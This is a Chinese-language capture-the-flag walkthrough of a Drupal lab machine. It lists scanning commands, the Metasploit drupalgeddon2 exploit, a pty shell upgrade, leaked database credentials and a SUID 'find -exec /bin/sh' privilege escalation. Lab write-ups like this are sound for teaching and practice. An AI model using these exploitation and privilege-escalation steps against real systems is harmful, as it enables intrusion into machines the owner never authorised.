@@ -1,0 +1,106 @@
+
+# 安装虚拟机
+安装完成之后准备进去开启服务，结果发现没有告诉账号密码
+图1
+看来是设置了数据库和web服务开机自启
+
+#探测靶机IP
+进入kali，使用命令：
+```
+arp-scan --interface=eth0 192.168.184.0/24
+```
+图2
+发现`192.168.184.133 00:0c:29:3f:9a:88       VMware, Inc.`是靶机的ip；
+
+# 扫描开放端口
+扫描全端口命令：
+```
+nmap -p 1-65535 -T4 -A -v -Pn 192.168.184.133
+```
+图3
+发现开放了22和80端口。
+
+# 访问80端口
+图4
+该网站的cms是drupal，查找该cms的漏洞信息
+图5 
+
+# metasploit漏洞利用
+ 利用关键字查找drupal的利用模块
+```
+search Drupal
+```
+图6
+```
+use exploit/unix/webapp/drupal_drupalgeddon2 
+```
+图7
+设置必填选项
+```
+set rhost 192.168.184.133
+```
+图8 
+利用
+```
+run
+```
+图9
+进入shell界面
+由于shell界面显示内容与正常的shell界面不一样，需要使用python脚本转换一下（看的别人的writeup，一开始我也觉得不对劲，但是不知道可以转）
+```
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+正常了
+
+# 找flag
+## flag1 
+```
+ls
+```
+当前文件夹就发现了flag.txt：
+```
+Every good CMS needs a config file - and so do you.
+```
+图11
+## flag2
+根据提示在网上搜索drupal的配置文件地址
+发现在路径为
+```
+sites/default/settings.php
+```
+直接进入该路径打开配置文件
+发现了flag2和数据库配置
+图12
+登录mysql，账号密码
+dbuser
+R0ck3t
+```
+mysql -u dbuser -p 
+```
+查找账号名密码
+结果发现是使用了cms特制的hash加密方法，而加密算法php文件执行出现了错误
+因此暂时不考虑修改数据库登录网站
+
+## flag3
+
+## flag4
+习惯性的进入了home文件夹，正好发现了flag4...
+图13
+它提示要我进入root文件夹，我尝试了一下发现没有root权限
+所以需要提权
+
+### find提权
+首先查找由suid权限的文件
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+选择usr/bin/find
+图15
+
+利用方法
+```
+touch test
+find test -exec '/bin/sh' \;
+```
+图16
+找到thefinalflag.txt
